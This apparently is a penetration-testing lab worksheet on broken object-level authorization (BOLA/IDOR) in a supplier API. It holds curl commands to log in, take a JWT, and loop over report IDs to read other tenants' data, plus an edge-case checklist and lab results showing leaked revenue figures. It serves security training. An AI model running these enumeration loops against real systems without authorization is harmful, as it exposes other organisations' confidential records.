# Batch 01 — BOLA / IDOR (Broken Object Level Authorization)

## FILL IN

```bash
BASE="http://154.57.164.65:31687"   # change per spawn
EMAIL="htbpentester1@pentestercompany.com"
PASS="HTBPentester1"
# after login:
# JWT="eyJ..."
```

## GOAL
Prove you can read **other tenants’ objects** by changing an ID, while logged in as a low-privilege user (Supplier).

> **Not Broken Auth** (you use a valid JWT). **Not BFLA** (function may be allowed). **Not BOPLA** (wrong *object*, not extra *fields*).  
> See [00-authz-authn-compare.md](./00-authz-authn-compare.md) for evidence comment templates.

## TIME
45–90 min

## YOU NEED
- Target up + Swagger (or OpenAPI)
- `curl` (and optionally pinchtab + gori)
- Authorized lab only

---

## WHY (30 seconds)

APIs often do:

```text
GET /resource/{id}  →  return row WHERE id = {id}
```

They check **“is this user logged in?”** but not **“does this row belong to this user/company?”**

That is **BOLA** (OWASP) / **IDOR** / **CWE-639 Authorization Bypass Through User-Controlled Key**.

**IDs can be:**

| Type | Example |
|------|---------|
| Integer | `1`, `13` (easy to walk) |
| UUID/GUID | `b75a7c76-e149-4ca7-…` (harder, still leakable) |

Academy lesson: role grants *function* (`GetYearlyReportByID`) but not *object ownership*.

---

## DO THIS

### 1) Map the API (Swagger)

```bash
# Browser / pinchtab
# $BASE/swagger/index.html

curl -sk -o swagger.json "$BASE/swagger/v1/swagger.json"
grep -o '"\/api[^"]*"' swagger.json | sort -u | head -50
```

**pinchtab**

```bash
export PINCHTAB_SESSION=$(pinchtab session create --agent-id api-bola)
pinchtab nav "$BASE/swagger/index.html" --snap
pinchtab screenshot -o swagger-ui.png
```

**gori** (optional): start proxy, set browser through gori, click Swagger “Try it out” so every call is in history for ID replay.

### 2) Login as Supplier → JWT

```bash
curl -sk -X POST "$BASE/api/v1/authentication/suppliers/sign-in" \
  -H 'accept: application/json' \
  -H 'Content-Type: application/json' \
  -d "{\"email\":\"$EMAIL\",\"password\":\"$PASS\"}"
```

Copy `jwt` from JSON:

```bash
JWT=$(curl -sk -X POST "$BASE/api/v1/authentication/suppliers/sign-in" \
  -H 'Content-Type: application/json' \
  -d "{\"email\":\"$EMAIL\",\"password\":\"$PASS\"}" \
  | python3 -c 'import sys,json; print(json.load(sys.stdin)["jwt"])')
echo "JWT length: ${#JWT}"
```

Swagger UI: **Authorize** → `Bearer <jwt>` → lock closes.

### 3) Establish *your* object baseline

```bash
# Who am I?
curl -sk -H "Authorization: Bearer $JWT" -H 'accept: application/json' \
  "$BASE/api/v1/suppliers/current-user"

# My company (Guid)
curl -sk -H "Authorization: Bearer $JWT" -H 'accept: application/json' \
  "$BASE/api/v1/supplier-companies/current-user"

# My roles (function-level grants)
curl -sk -H "Authorization: Bearer $JWT" -H 'accept: application/json' \
  "$BASE/api/v1/roles/current-user"
```

**Write down:**

```text
my_company_id=
my_roles=
```

Lab expected role: `SupplierCompanies_GetYearlyReportByID`  
Lab expected company: `b75a7c76-e149-4ca7-9c55-d9fc4ffa87be` (may change per spawn)

### 4) Hit the object endpoint (integer ID)

```bash
# Academy vulnerable shape
curl -sk -H "Authorization: Bearer $JWT" -H 'accept: application/json' \
  "$BASE/api/v1/supplier-companies/yearly-reports/1"
```

**BOLA if:** `companyID` in the report **≠** `my_company_id`.

### 5) Mass-abuse loop (academy pattern)

```bash
for ((i=1; i<=20; i++)); do
  curl -s -w "\n" -X GET \
    "$BASE/api/v1/supplier-companies/yearly-reports/$i" \
    -H 'accept: application/json' \
    -H "Authorization: Bearer $JWT"
done
```

Pretty (if `jq` installed):

```bash
for ((i=1; i<=20; i++)); do
  curl -s -w "\n" -X GET \
    "$BASE/api/v1/supplier-companies/yearly-reports/$i" \
    -H 'accept: application/json' \
    -H "Authorization: Bearer $JWT" | python3 -m json.tool
done
```

### 6) Confirm ownership mismatch (one-liner)

```bash
MY=b75a7c76-e149-4ca7-9c55-d9fc4ffa87be   # paste yours
for i in 1 2 3 13; do
  body=$(curl -s -H "Authorization: Bearer $JWT" \
    "$BASE/api/v1/supplier-companies/yearly-reports/$i")
  echo "$i $body" | python3 -c "import sys,json,re; s=sys.stdin.read();
i,s=s.split(' ',1); o=json.loads(s); r=o.get('supplierCompanyYearlyReport',o);
print(i, 'OTHER' if r.get('companyID')!='''$MY''' else 'MINE', r.get('companyID'), r.get('revenue'))"
done
```

### 7) Write 3 lines

```text
BOLA: yes/no
endpoint:
other_company_ids_seen:
```

---

## EDGE CASES (real world — beyond Academy)

Do these **after** the basic walk. They catch “fixed for id=1 only” and inventory bugs.

| # | Test | Why |
|---|------|-----|
| E1 | **No auth** on same URL | Should be 401 — if 200, broken auth not just BOLA |
| E2 | **Bad / none JWT** | 401 expected |
| E3 | IDs `0`, `-1`, big `99999` | Error shape vs data; oracle for existence |
| E4 | **Sequential range** 1…N until “not found” | Full dump size |
| E5 | **UUID in integer slot** | 404 vs 500 (error handling) |
| E6 | **List endpoint** without `{ID}` | Often 403 (BFLA) while `{ID}` is BOLA — still note |
| E7 | **Other ID params** in Swagger (`orders/{ID}`, `customers/{ID}`, products) | Same class, more impact |
| E8 | **Create object as A, access as B** (if two accounts) | Classic IDOR proof |
| E9 | **Change method** PUT/DELETE on object | BOLA write/delete |
| E10 | **Encode / HPP** `id=1&id=2`, `id[]=` | Parser confusion |
| E11 | **Horizontal vs vertical** | Same role other tenant vs escalate to admin objects |
| E12 | **Predictable GUIDs** (timestamp, sequential) | When ints are fixed |
| E13 | **Export / report / PDF / photo** by ID | Files often weaker than JSON |
| E14 | **GraphQL** `node(id:)` / relay global IDs | Same BOLA idea |
| E15 | **gori/Burp match-replace** on path ID while browsing Swagger | Fast manual fuzz |

### Edge-case paste kit

```bash
# E1 no auth
curl -sk -o /dev/null -w "%{http_code}\n" \
  "$BASE/api/v1/supplier-companies/yearly-reports/1"

# E3 weird ids
for i in 0 -1 99999; do
  echo -n "id=$i "
  curl -sk -H "Authorization: Bearer $JWT" \
    "$BASE/api/v1/supplier-companies/yearly-reports/$i"
  echo
done

# E6 list vs item
curl -sk -o /dev/null -w "list:%{http_code}\n" -H "Authorization: Bearer $JWT" \
  "$BASE/api/v1/supplier-companies/yearly-reports"
curl -sk -o /dev/null -w "item:%{http_code}\n" -H "Authorization: Bearer $JWT" \
  "$BASE/api/v1/supplier-companies/yearly-reports/1"
```

### Lab results (154.57.164.65:31687 — Aug 2026)

| Check | Result |
|-------|--------|
| Login Supplier | OK → JWT HS512, role `SupplierCompanies_GetYearlyReportByID` |
| Own company | `b75a7c76-e149-4ca7-9c55-d9fc4ffa87be` |
| `yearly-reports/1` | **200** company `f9e58492-…` ≠ own → **BOLA** |
| `yearly-reports/13` | **200** other company revenue + C-level comments |
| Mass 1–20 | IDs **1–18** return reports; 19+ “not found” |
| No auth | **401** |
| List `/yearly-reports` | **403** (function OK for by-ID only) |
| Company by GUID | **403** with this role |
| Evidence | `notes/inlanefreight-bola/evidence/` |

---

## Prevention (for reports)

Server must compare **resource.owner / companyID** to **authenticated principal** on every object access. Role alone is not enough. Deny if mismatch.

---

## IF / THEN

| You see | You do |
|---------|--------|
| Other tenant data | Report BOLA + sample IDs + impact (revenue, PII) |
| Only own company | Try other endpoints / second account |
| 401 without token, 200 with any ID | Classic academy BOLA |
| 403 on all IDs | Need different role or auth bypass first |

---

## NEXT
Later batches (auth, BOPLA, BFLA, SSRF, …) when added.  
For now: re-run this card on **every** `{ID}` path in Swagger.

## OWASP / CWE

- API1:2023 Broken Object Level Authorization  
- CWE-639 Authorization Bypass Through User-Controlled Key  
- Also called IDOR
